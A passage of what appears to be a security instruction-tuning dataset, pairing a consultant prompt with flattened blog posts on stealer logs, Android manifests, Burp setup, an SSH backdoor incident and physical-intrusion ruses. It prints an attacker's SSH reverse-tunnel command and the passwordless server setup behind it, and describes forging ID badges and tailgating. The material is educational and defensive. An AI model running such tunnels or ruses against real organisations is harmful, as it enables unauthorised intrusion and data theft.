updated on March 1 2023 and appears to cover all versions of Sysmon Microsoft Azure Parsers GitHub Repo and has a Sysmon parser available Buttttttttt here's another one we wrote for our APT class crafted from other bits and pieces available As shown you want to copy the contents of the parser Paste the entire blob into a Sentinel Logs query window and run it The query may take a moment Once complete click to Save As Function Name the function accordingly it matters because you will be using this to query Sysmon logs in all future queries As shown it was named SysmonParser Finally run the function in a new query window by calling SysmonParser and looking for those couple of event IDs 27 and 28 Reference Materials Sysmon the best system monitor for Windows Even better than Windows auditing Olaf Hartong's Sysmon Modular The best configuration generator for Sysmon ever shared with the world Olaf Hartong's recent article on Sysmon EID 27 file block executables and the baseline for getting this written the parser cleaned up and pushed to GitHub Thanks for reading and keep defending out there -jd"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Your Browser is Not a Safe Space</title>\n<taxonomies>Blue Team, Corey Ham, Informational, Red Team, Browser Security, Data Breaches, Malware, Password Managers, Stealer Logs</taxonomies>\n<creation_date>Tue, 14 Mar 2023 04:52:50 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Corey Ham Tl dr Use a password manager instead of browser storage for passwords credit card numbers and other autofill items Personal security Do not save anything sensitive in your browser especially credentials This data will probably be spread further than you realize and it can be accessed by malware Consider deleting all credentials and autofills from your browser of choice Enterprise security Prevent users from both saving credentials in browser credential stores and consider preventing users from logging into their browsers on enterprise-managed hosts Enforce access controls that prevent users from signing into browsers on non-managed hosts if possible Monitor for credential abuse The Story I do red team engagements for BHIS These engagements are designed to cover the widest attack surface possible for a target entity We operate with broad scoping meaning we can attack any user computer application or fax machine we identify as owned by the target unless explicitly provided as out-of-scope ahead of time During a recent red team engagement I gained access to employee credentials browser cookies screenshots of a user's desktop and some interesting files on the first day of testing Now you might be thinking this sounds like a brag about my god-tier hacker skills or that the target had terrible security if I managed to get that far on day one The truth is I probably didn't even have command-and-control infrastructure set up yet and the target had excellent security So how did this happen I found all this data in some Stealer Logs Stealer Logs I first became aware of stealer logs at WWHF Deadwood 2022 where I had a great conversation with Mishaal Khan after his talk where he demonstrated using them for OSINT I'm something of an OSINT fan myself and the main data breach wrangler at BHIS so I resolved to get my hands on some of this data and check it out for myself I eventually managed to get heaps and heaps of it totaling over 10TB of data I then worked to process as much of the data as possible to make it searchable I'll spare you the boring details of this but suffice it to say that black hat hackers are absolutely TERRIBLE at organizing files Let me know if you'd like to see a separate blog post or webcast detailing how I processed the data and made it searchable in our private breach database For a quick overview of what the logs themselves look like check out this excellent blog from IntelTechniques nteltechniques.com blog 2022 07 06 new-breach-data-lesson-ii-stealer-logs A brief overview Stealer malware is distributed in a variety of ways including being packaged with cracked pirated software in phishing campaigns and in malvertising Stealers are commodity malware that are cheap 100 and there are quite a few variants including Redline Raccoon Vidar and more Stealers commonly grab the following information from the victim System information running processes installed software screenshots Browser data credentials history cookies autofills etc Browser credential data is generally reported with four fields Host URL Username Password Browser version i.e Chrome 104 Interesting-looking files Specific extractors are built for high-value software such as cryptocurrency wallets video games discord authentication tokens etc Webcam captures depending on variant The malware doesn't stick around for long but grabs what it can and sends it off to a central server for processing Once there each victim's data is packaged and the data is sold on forums and telegram groups often in large collections They are not particularly expensive with the average victim's data costing cents or even fractions of a cent For reference a victim's folder might look something like this The contents are pretty much self-explanatory Some variants list what anti-virus programs are present whether the process is elevated and what UAC permissions the user has The screenshots of victim's desktops are equal parts sad and hilarious Some of them make me feel like I am way over-engineering my payloads The Victim So back to the story As you'd probably imagine reconnaissance is a huge part of a red team I personally enjoy the recon process as I use it to gather the situational awareness and confidence I need to execute attacks later on The more I know about how the target entity operates the more I can use it against them especially during social engineering and post-exploitation After I started processing stealer logs I added searching for them to my recon workflow on all engagements specifically searching for client domains in the host field and username fields This started turning up results almost immediately but here's a specific story that I think illustrates the risks well I discovered a result where one of the captured credentials had a URL like itrix.client.com vpn login The username captured for this site appeared to be a valid username but the password saved was a six digit number This was likely a temporary MFA code and we were unable to access the Citrix interface using the captured information I extracted and browsed through the user's entire log folder which contained roughly 67 sets of credentials but no other information we could leverage for initial access We launched a long-running credential stuffing campaign targeting this user using all the credentials listed in the stealer log Bad for us but good for the client this attack was unsuccessful and we hit smart lockout on that user's account in all data centers Once we admitted defeat on using the data for initial access we contacted the client to inform them of the situation and to have them put us in touch with the victim I wanted to provide the user with the full stealer log file archive so they could attempt to invalidate all the information that had been disclosed However I was not comfortable with sharing the entire dump with the victim's employer given the personal nature of the data At the same time our client would not want to be responsible for transmitting and storing the user's personal data Eventually we settled on sending the contents within an encrypted zip file with the password being verbally exchanged over the phone The victim was very polite and appreciative of the heads up which I found admirable The part that surprised me the most was that the victim had no awareness that their computer was compromised or even that their data was exposed I asked if they had received spurious MFA push notifications suspicious login notifications or any other indicators of compromise but they were aware of none The malware executed over a year before I discovered it during this engagement This leads me to believe that the attackers that collect this data must triage it and only act against the most valuable targets those with credit cards cryptocurrency wallets and other information that can lead to quick and direct financial gain As for how the victim was infected one of their children managed to infect the family computer while installing cracked software The victim mentioned to me during our conversation that they would be having a family meeting to work together to change all the affected passwords and use it as a teachable moment which is great At this point we went our separate ways and we continued our red team engagement What Next As we concluded the engagement and moved to reporting I began to consider what the client could do to prevent this kind of thing from happening again First I considered the technical mechanism that led to this data leakage in the first place I do not have enough evidence to prove exactly what happened but I thought of some possibilities The user logged into their work browser with their personal account causing existing and future credentials to be synced via their personal Google Microsoft account to their home computer The user logged into their home computer browser with their work account syncing all the credentials stored there to their home computer The client uses a bring-your-own-device BYOD access model that allows employees to remotely access company resources from personal computers In all cases personal and work data would be commingled leading to potential data leakage Technical Controls For years I have been reporting browser credential storage allowed as a finding mainly when we use tools like SharpChromium and SharpDPAPI during post-exploitation and discover users saving their passwords in browser credential storage as opposed to a password manager The recommendation there is to use GPO or MDM to fully disable this functionality in all browsers There is a possibility that this would have prevented the user from saving the password in the first place if they only ever logged into the Citrix interface from a managed computer This situation brought up the possibility of an additional recommendation which is to prevent users from signing into their browsers at all While I considered this it could reduce the efficiency of some workers that switch between approved devices often It also is the kind of security solution that I hate one that blocks a bunch of useful features to prevent a subset of them from being abused User Security Awareness As much as I hesitate to pull this lever so often I think making users aware of the implications of browser sync is helpful for the employee and the employer This goes way beyond security I think most people would not want their browser history shared with their spouse or close friends let alone their employer As more applications move to the web client model we put more sensitive data into our browsers than ever before Detection Although breached data might seem outside of our control monitoring and detection can prevent this data from being abused Knowing exactly what data is breached in the first place goes a long way both for companies and individuals At the time of writing there is no public site I am aware of that is like HaveIBeenPwned but for stealer logs If you know of a good one please get in touch For companies there are likely paid data breach monitoring services that ingest stealer logs You could also subscribe to our Continuous Testing offering which is structured in a way that allows us to use these techniques long-term just like real attackers do shameless plug For individuals searching for your data in stealer logs is more difficult There is a government website accoon.ic3.gov home that will allow you to determine if your data was stolen by Raccoon Stealer HaveIBeenPwned has roughly 400 000 records from the Redline stealer which is a limited subset Currently my dataset contains close to 10 million victims and I am likely missing quite a bit of data Companies should also monitor for credential stuffing attacks and respond accordingly especially if a valid login occurs Defenders should also be aware of the security implications of browser data My Advice Use good password manager for both enterprise and personal security Disable browser credential storage for all browsers on all managed computers using Group Policy or Device Management tools like Intune Clean up previously saved logins and other sensitive data Educate users and defenders Bring awareness to the amount of data exchanged when signing in to a browser Demonstrate how to manually disable credential storage export old credentials and import them into a password manager of their choice Thanks for reading"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Ssh Don't Tell Them I Am Not HTTPS: How Attackers Use SSH.exe as a Backdoor Into Your Network</title>\n<taxonomies>Blue Team, C2, Derek Banks, Hunt Teaming, Incident Response, Informational</taxonomies>\n<creation_date>Tue, 21 Mar 2023 15:55:46 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Derek Banks Living Off the Land Binaries Scripts and Libraries known as LOLBins or LOLBAS are legitimate components of an operating system that threat actors can use to achieve their goals during a campaign against your organization They do this to try to avoid detection from endpoint protection products and as an alternative to writing custom malicious code Credit original art Locust Years In many cases these binaries are well known the techniques documented and hopefully the malicious use is detectable by security products or threat hunting processes However in a recent incident response engagement we found a LOLBAS technique that did not fall in that category of well documented In fact the technique does not currently appear to be in the MITRE ATT K framework The scenario was that the client had users report odd behavior on their laptops There were fraudulent purchases made on personal accounts from their work system when they were not at work at the time When initially investigating the client determined that there were Remote Desktop Protocol RDP connections from their domain controllers to the endpoints in question Understandably the client became very concerned and contacted BHIS for Incident Response assistance We deployed Velociraptor in the environment and started analyzing network connections to the internet We found that on a handful of Windows servers there was a very suspicious Secure Shell SSH command connected to an external IP address But wait SSH on a Windows server Isn't that a Linux thing We have found on both penetration tests and incident response engagement that many still do not realize the impact of the decision Microsoft made in 2018 to include OpenSSH in Windows Server and Desktop OSes The old systems administrator in me likes the decision and thinks it's about time I do not need a third party SSH client But the security analyst in me knows that SSH is an amazingly powerful and versatile tool Threat actors know its power and versatility too It is more capable than just logging in to a remote server and interactively running commands Take the command we found during this incident investigation for example ssh.exe sshtunnel blackhillsinfosec.com -f -N -R 50000 -p 443 -o StrictHostKeyChecking no In this SSH command the attacker was establishing a SSH connection to the remote server at evil.com with a very specific intent in mind a reverse tunnel into the victim network so that they can run their own commands against internal systems This is accomplished with the flags used in this particular command -f The SSH command runs in the background Used by the attacker to obfuscate their presence -N Do not execute a remote command This is useful when just forwarding ports -R Specifies that the given port on the remote host is to be forwarded to the local host and port on the victim network This works by allocating a socket to listen to a port on the remote side and whenever a connection is made to this port the connection is forwarded over the secure channel and a connection is made to victim machine This makes it a SOCKS proxy -p The port used to connect outbound from the internal network to the remote host in this case TCP 443 commonly associated with HTTPS not SSH -o Options for which there is no specific command line switch in this case StrictHostKeyChecking no The StrictHostKeyChecking no option is used so that when the command is run the SSH client does not ask to verify the server host key you know that message we all just answer 'yes to when connecting to an SSH server But why would the attacker do this They wanted to avoid that interactive prompt in a new SSH command from a new host because of persistence There was a scheduled task that ran a batch file stored in C Windows Temp that was similarly named to a valid Windows DLL Some of you may be thinking What about the password prompt when SSH connects Others may be thinking that the attackers solved that interactive password prompt by dropping an SSH private key on the system That is what I thought too However there was not a private key to be found on any of the compromised hosts This really made me curious how could that be possible could it really be no password to authenticate That would not be a good choice for an attacker to make After some sciencing in the lab it turns out that the answer is sort of OpenSSH server allows configuration for a tunnel only user in that a specific user account can be set up to not receive a shell when authenticating In the server-side configuration the following option in the sshd_config file sets up a tunnel only user Additionally the SSH tunnel only user needs to have an empty password This can be accomplished with the passwd command with the -d switch The last configuration piece to allow the tunnel only user to connect is to add 'ssh to the etc securetty file This is necessary for allowing a user with an empty password to login over SSH This configuration will not allow the tunnel only user sshtunnel to connect and establish a shell or run commands on the remote server but only establish a connection that sets up the reverse proxy type configuration What can an attacker do with this In many ways it's analogous to plugging a computer physically into the network Making the assumption that there are compromised domain credentials which is likely to make it to the point of setting up SSH in this manner you can do pretty much whatever you need to accomplish your nefarious objectives For example you can proxy RDP through SSH to connect to systems that the compromised credential has access to One of the things I like to do on penetration tests with proxy access similar to this is use proxychains and Python utilities like Impacket and Python Bloodhound to attempt to avoid host-based detection How do you detect and prevent this from happening to your network One of the most common things we see in Incident Response and Penetration Test clients is the lack of sufficient egress network traffic filtering from the local network to the internet If you have an application layer firewall most firewalls these days probably are you can prevent a successful SSH connection on an off port by configuring it so that only the expected application traffic can use the associated port For example only HTTPS traffic can use TCP 443 SSH cannot In addition it would work to implement a deny rule for any TCP ports you do not use for business purposes If there are ports that are limited use like TCP 22 for SSH and only a few systems administrators need to use it limit the port to those individuals as an exception There are some good detection opportunities here as well The specific SSH flags in use here are not common for normal systems administration Alerting on the use of those flags from the command line across your environment should generally be a high-fidelity alert From a threat hunting perspective you could take a look at all of the known_hosts files in the environment When SSH connects to a host on a port that is not TCP 22 it will put brackets around the host name In most environments brackets in a known_hosts file should be considered suspicious Please note the screenshot above is an example known_hosts file and obviously does not contain the atomic indicators IP address and host name from the incident Those are not shared publicly but if you are a BHIS SOC customer you already have detection and active threat hunting for this threat actor"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Got Enough Monitors?</title>\n<taxonomies>Carrie Roberts, General InfoSec Tips & Tricks, Informational</taxonomies>\n<creation_date>Tue, 28 Mar 2023 15:30:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Roberts Guest Blog OK I admit it I might have a problem But seriously can you ever really have enough screen space In this blog post I'll describe a cheap solution for having a lot of screen space for your work-from-home office I will also share other aspects of my office that make it functional and enjoyable links are included if you are interested in imitating any of it I'm using five 43 4K televisions as monitors for my work-from-home office Each TV is less than 200 and they work great for everything I do from viewing Office documents to joining Zoom meetings I'm not a graphic designer I'm clueless about color accuracy and I don't play games where you would most likely notice issues using TVs as monitors I have two computers hooked up to these five monitors The screen in the middle is hooked to an HDMI switch for easy switching back and forth between my work computer and my personal computer depending on what I am focusing on at the time The two monitors on the left are always hooked up to my work computer and the two monitors on the right are always hooked up to my personal computer It is important to switch the middle monitor with the switch instead of the TV's input switcher because windows will hide on the invisible screen using the TV's input switcher I like to use the upper monitors for things like keeping an eye on my calendar email messaging apps and as one consistent place for controlling my music I recommend setting your mouse pointer options to move fast so that you can get to all edges of your monitors in one wrist motion without having to lift up your mouse It takes some adjustment to get used to but then is easily doable Sometimes you lose track of where the mouse pointer is on the screen and it is hard to find On macOS you can quickly move the mouse pointer back and forth and the pointer will show up much larger for a second so you can find it go to Settings Accessibility Display Pointer to customize On Windows this option works well On my personal computer I use the free Microsoft FancyZones tool to break the screen up into any layout I want and easily snap my windows to the layout I recorded a demo of it here My monitors are very close to the ceiling because I have a raised desk to allow for the treadmill underneath but that's another story I record a lot of content for online training so I've doubled up on my webcams and microphones so that I don't have to switch them back and forth between my work and personal computers I had a USB switch originally but I ruined two Yeti Nano microphones and two USB switches doing that I don't think they are built for that kind of switching You also see that my personal computer is on a stand in the middle and one of my cameras is on an adjustable arm This is so I can present from a 1080p monitor and lower the camera so it looks like I am looking into the camera more If I didn't record so much content I wouldn't go through so much trouble Of course I want to be able to switch my keyboard and mouse back and forth between the two computers but the 1-2 second delay on all the switches can be annoying when I just want to skip a song or respond to a message with an emoji on my personal computer For this reason I keep one mouse for each computer by my keyboard I don't switch the keyboard between computers nearly as much so I just use this cheap multi-computer keyboard I do have a mouse that can switch between 3 computers easily but not fast enough for me so I prefer two different mice For my recordings and online meetings I wanted to have something cool in the background so I built this Wonderstructs marble maze and I love it It looks deceptively small in the picture but it is 6 ft tall x 10.5 ft wide and takes up the entire wall I use two LED wall washer lights to give it the color You can see them mounted just under my desk on the left and right in the photo with the monitors I also use two studio lights to allow me to have consistent lighting day and night for my recordings The lights are also shown in the monitor picture on the outside of the upper monitors The lights are wirelessly connected and I can control their brightness and color from an app on the computer as well as on my phone Some other things I enjoy in my office are a booming stereo system a multi-port usb charging station this super comfy swinging chair my under-desk treadmill this wall mounted coat rack a mega powerstrip and this 100 oz jug full of diet coke It takes a very large desk to house this much screen real estate because the screens are ideally set back a fair distance from your face My center screen is 3 feet away from my face The desk itself is made from a sheet Melamine and is 3.5 ft x 8ft If you do decide to try these TVs for monitors remember to set your display settings from your computer to 30 Hz and to play with the TV settings press on the remote and try the different picture modes to see which you like best I had a couple of TVs where the text on the screen didn't look sharp until I changed the mode Some cables dongles and docking stations don't support 4K and will limit your resolution on these TV's You may need to buy a few HDMI to USB-C cables to hook the TVs up directly to your computer And remember you must get the 4K version of the TV or life will not be good Good Luck I've been working from these monitors for 4 years and I'm very happy with them Check out a related blog of Carrie's Healthy Hacking with the Treadmill Elliptical Desk"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Field Guide to the Android Manifest File</title>\n<taxonomies>Cameron Cartier, Informational, InfoSec 101, Mobile, Android, android hacking, Android Security, Application Security, hacking, reverse engineering, security</taxonomies>\n<creation_date>Thu, 06 Apr 2023 16:16:04 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Cameron Cartier Every Android application has a manifest.xml file located in the root directory of the APK Remember APKs are just zip files The manifest file is like a guide to the application It describes all of the components of the app the application permissions and the required hardware software features Developer misconfigurations to this file for example marking an activity as exported can have serious effects on the application's security Many static analysis tools i.e MobSF get a lot of their information by simply parsing this file In this blog we are going to walk through a sample of the fun things you can learn from an apps manifest file as a hacker We will be using the monolithic social media app TikTok for this analysis Now lets have some fun The manifest file is in binary xml format This means that if you unzip the APK file you will see that manifest.xml is mostly undecipherable To fix this we decompile the app with Apktool instead Apktool Command apktool d app.apk This may take a few minutes since we are using a large app Now opening the manifest file in a text editor shows us the human-readable version depending on your definition of human-readable that is The first thing worth noting is the package name package com.zhiliaoapp.musically This is what is used by the operating system to identify your app It also tells you the app's internal storage location Apps store their data cache databases etc at data data You can also determine if the app shares a sandbox with any other applications If the app does share a user ID it will have the entry android SharedUserId For example many system applications will share android.uid.system IID 1000 This allows them to share data and operate with higher permissions than user-installed apps In older applications the manifest file will include the minimum and maximum Android SDK versions As of Android 11 this is no longer allowed and these must be declared in the Gradle files instead There are also a set of flags that allow disallow actions on the application Here are two you should pay attention to as a tester as they can be dangerous Android Allowbackup true This allows anyone with access to the device to make a copy of all of the application's data An example of when this could be dangerous is if an adversary with device access is able to download un unencrypted database Android Debuggable true Apps should never be released with the debuggable flag set to true This can lead to sensitive information exposure It can also allow an attacker with device access to run arbitrary code using the applications permissions Permissions The manifest file is also required to specify which components of the device the app can interface with The user decides whether to grant the application these permissions at runtime An application cannot access any external features of the device unless it is explicitly declared with a tag Knowing what permissions an app is likely to have access to can be useful to an attacker when paired with another vulnerability that allows for code execution under the app's user As a security tester you want to call out any permissions that seem unnecessary Which permissions are necessary depends on the specific application Here is a small subset of the permissions requested by the TikTok app android.permission.SYSTEM_ALERT_WINDOW android.permission.REORDER_TASKS android.permission.INTERNET android.permission.ACCESS_NETWORK_STATE android.permission.READ_EXTERNAL_STORAGE android.permission.WRITE_EXTERNAL_STORAGE android.permission.ACCESS_WIFI_STATE android.permission.CAMERA android.permission.RECORD_AUDIO android.permission.FLASHLIGHT android.permission.WAKE_LOCK android.permission.GET_TASKS android.permission.READ_CONTACTS android.permission.RECEIVE_BOOT_COMPLETED android.permission.VIBRATE 30 android name android.permission.BLUETOOTH com.meizu.c2dm.permission.RECEIVE com.zhiliaoapp.musically.permission.READ_ACCOUNT In addition to permissions there is also the tags Each of these declares a hardware or software feature the application requires to function properly The requires true means the app will not be able to run in an environment without that feature present i.e bluetooth capability The Google Play Store may filter out applications requiring features the user's phone does not have Application Components An application is required to have a manifest entry for each of its components These include activities services content providers and broadcast receivers Similar to public private classes in object-oriented languages each individual instance of one of these can be exported or not exported If the exported flag is set it can be accessed from other apps as well First let's talk about activities Each activity will be declared with an tag in the manifest file Activities are activated by intents as are services and broadcast receivers The intent is passed to the system and the system determines which component of the app can handle the intent using the intent filters These filters are declared in the manifest with intent-filters By declaring intent filter s for an activity you make it possible for other apps or the system to launch your application Every app will have an activity with an intent-filter block that looks very similar to the following code block android.intent.action.MAIN android.intent.category.LAUNCHER This indicates the entry point of the application The line android.intent.category.LAUNCHER says to the app When the user clicks the icon for this app launch this activity Figuring out where the app starts is a good first step in reverse engineering Above shows the entry point for the TikTok app Another thing you would want to look for as a tester is exported activities An activity is exported if either they have the android exported attribute set to True OR they have an block and the exported attribute is unset Services differ from activities in that they do not have a UI component and are often used to run background tasks Otherwise all the rules above still apply Looking at the intent filters can also give us clues as to the function of an component Take this service from the TikTok app for example true android name com.heytap.msp.push.service.DataMessageCallbackService android permission com.heytap.mcs.permission.SEND_PUSH_MESSAGE com.heytap.mcs.action.RECEIVE_MCS_MESSAGE com.heytap.msp.push.RECEIVE_MCS_MESSAGE From just the manifest entry and some quick Google searches without looking at the source code we can tell that this service is responsible for handline Android push notifications Further Research If you really want to take a deep dive into how the android manifest works the Android Developers Reference is a great place to start eveloper.android.com guide topics manifest manifest-element"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Genymotion - Proxying Android App Traffic Through Burp Suite  Cameron Cartier</title>\n<taxonomies>Informational</taxonomies>\n<creation_date>Fri, 07 Apr 2023 16:51:47 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "ww.youtube.com embed aqqdy7460yo Mobile App Testing is a category showing no signs of slowing down In this video BHIS tester Cameron Cartier walks us through linking Genymotion to Burp Suite for traffic monitoring Included below are the commands referenced in the video General List devices Adb devices -l Connect to the listed device Adb connect Go to shell on connected device Adb shell Openssl Commands for Converting the Burp Cert openssl x509 -inform DER -in burp.cer -out burp.pem openssl x509 -inform PEM -subject_hash_old -in burp.pem head -1 mv burp.pem 9a5ba575.0 adb root adb remount adb push 9a5ba575.0 sdcard adb shell mv sdcard 9a5ba575.0 system etc security cacerts chmod 644 system etc security cacerts 9a5ba575.0 Pointing Genymotion at Burp adb shell settings put global http_proxy localhost adb reverse tcp tcp"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Shenetworks Recommends: 9 Must Watch BHIS YouTube Videos</title>\n<taxonomies>General InfoSec Tips & Tricks, Informational, Serena DiPenti, Pentesting</taxonomies>\n<creation_date>Thu, 13 Apr 2023 16:30:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "shenetworks The Black Hills Information Security YouTube channel has over 400 videos available Over the past year I have attended many webcasts and explored plenty of the videos I put together this list to highlight videos that have helped me on my penetration testing journey If you are interested in expanding your knowledge related to pentesting I recommend starting with these Getting Started with Burp Suite Webapp Pentesting BB King ww.youtube.com embed xKudsnN3gkE Of course we must start with Burp Suite presented by the master BB King Burp is an essential and an incredibly valuable tool for webapp and API pentesting Burp has a TON of useful features but it can be a little overwhelming to parse through and find which features will be most valuable to you Tabs like intruder repeater sequencer comparer Are they different yes BB's video covers the installation of Burp and an overview of the tool's features Bonus For more Burp related content check out Basics of Burp ing for Testing Web App Security by Chris Traynor ww.youtube.com watch?v Gb7OQm5-Xdw Pentester Tactics Techniques and Procedures TTPs Chris Traynor outu.be mtAcfEWOoJI Chris's video is a really great place to start if you're new to pentesting Chris goes over terminology and essential tools like NMAP Recon-ng Burp and a few Burp extensions Chris also covers tactics like account enumeration password spraying and smb_login Securing AWS Discover Cloud Vulnerabilities via Pentesting Techniques Beau Bullock outu.be fg_hey18tio The cloud everyone has heard of it and most of us have used it in some capacity At some point in your pentesting career you will be given assets in the cloud Beau's video covers a wide range of topics such as AWS authentication initial access public accessibility of resources post-compromise recon and more How to Build a Phishing Engagement Coding TTP's Ralph May outu.be VglCgoIjztE Phishing attacks are a common request for any pentesting company It is helpful to understand the work behind crafting a phishing campaign and the tools available Ralph goes into detail on some of the common phishing pitfalls and tools you can use to create a successful campaign This video covers infrastructure designing a phish and an overview of different phishing tools available Shellcode Execution with GoLang Joff Thyer outu.be gH9qyHVc9-M Joff compares offensive GoLang to other popular languages and discusses executing shellcode on Windows As a pentester you will quickly get familiar with shellcode from various sources like msfvenom but it is valuable to learn to create your own shellcode This video provides a good broad overview of Golang and discussion on writing malware with embedded shellcode Coercions and Relays Gabriel Prud'homme outu.be b0lLxLJKaRs Coercions and relays is one of my favorite topics This is an extremely valuable and often successful technique to steal credentials and access Gabriel discusses network protocol vulnerabilities and tools available to exploit these vulnerabilities This video covers responder IPv6 Poisoning DHCP poisoning DA privilege Escalation and SO MUCH MORE How to Attack When LLMNR mDNS and WPAD Attacks Fail Eavesarp Tool Overview John Strand outu.be cKDdy0JFXpA On occasions you have no success with other relay attacks you still have other options ARP is the protocol that helps discover which mac address belongs to a specific IP Internet Protocol address Internal infrastructure changes over time and it often leaves behind stale configuration ARP requests can be sent out looking for hosts that no longer exist Stale configurations can be abused by attackers This video provides an in-depth explanation and tools available to use Eavesarp written by Justin Angel Kerberos Attacks 101 Tim Medin outu.be IBeUz7zMN24 Who better to learn from than the creator of Kerberoasting himself Tim Medin explains Microsoft's authentication protocol Kerberos and how it works I always forget Understanding the different methods of attacking Kerberos will be essential on internal pentests Kerberoasting Pass-The-Ticket Over-Pass-The-Hash Extract and Crack and other methods are discussed Things NOT to Do in Pentest Reports Tips Tricks and Traps in Report Writing Bronwen Aker outu.be eWNqaFf60fg Love it or hate it the pentest report is what people are paying for Bronwen has been writing and editing BHIS reports for years and put together this presentation to help you avoid common mistakes Final Thoughts These videos cover a wide range of topics to help anyone expand their knowledge I believe whether you are just starting out or a seasoned tester you will be able to take away some new pieces of knowledge I look forward to expanding this list in the future If you would like to be notified of future webcasts so you can attend live and ask questions you can sign up for our mailing list ww.blackhillsinfosec.com sign-up Good luck and happy hacking"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>If You Don't Ruse, You Lose: A Simple Guide to Blending in While Breaking In</title>\n<taxonomies>Informational, Joseph Kingstone, Physical, Red Team</taxonomies>\n<creation_date>Thu, 20 Apr 2023 16:30:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Joseph Kingstone Are you assigned a physical penetration test and want to fly under the radar and meet all of your objectives like the elite hacker you are Stick around and let's go over a few things that might help you blend in or stay undetected What is a Ruse What is a ruse exactly A ruse is a method used to outwit someone by deceiving them A ruse may involve a deceptive plan statement or device used The context we are using here is based on what you wear and how you appear OSINT The best ruse might be the one you research Look for these things Local College or Pro Teams What city or state is the assessment taking place Get an idea of a subject that you could brush up on and talk about Sports are a great icebreaker Company ID Cards Check a company's social media Figure out what ID cards look like and try to replicate one yourself using a Canon IVY or similar Company Events Through a company's site or social media try to find picnics unveiling ceremonies fundraisers or even softball games These are all events you could find badges to replicate clone or tailgate your way in among the madness for easy access Construction work Construction sites for a company often do not have things in place such as network access control NAC or monitoring If your goal is network access this may be your golden ticket Locations What locations did the customer give you to penetrate and what is your goal exactly It is always helpful to research the locations you are assigned to and also other sites you may find Try to identify what kind of access controls there are or dress code for those locations datacenters may be more relaxed than corporate headquarters If you have trouble meeting your objectives have an idea of other locations that may help you reach your objectives if communicated with the customer Badges If you have seen any badges posted publicly from your adventures in OSINT above try to replicate it Also try to mimic the badge placement on-site for your physical penetration test Even if you aren't able to clone or get legitimate badge access a well-made counterfeit badge might let you tailgate right behind an actual employee Pretext Security conscious employees got you down Pretext may help What is pretext In this context it's as simple as having a story about why you are somewhere or even why you need to be somewhere If you are in a networking closet have a story about router upgrades If you are in someone's office after hours you are fulfilling some janitorial duties Matching your pretext with your ruse is recommended Utility Worker The utility worker ruse is a fairly common ruse among penetration testers who perform physical security engagements It's not unusual to have a few industrial maintenance employees around keeping the facility running the way it should Unfortunately this ruse is also being seen by criminals who burglarize and steal packages off porches Security Guard Posing as a security guard is also a good ruse to work with A few caveats don't act like a cop you might have a bad time Security guard ruses can work just fine do some due diligence if you can See if there are already security guards there If there are you might want to find an alternative ruse IT Worker IT workers are never a bad idea You can dress normally and have less eyes on you as opposed to a security guard or having people wonder what kind of work you are doing in your utility jacket and hard hat An added bonus is that IT workers can slide right by with all your lockpicks traveler hooks 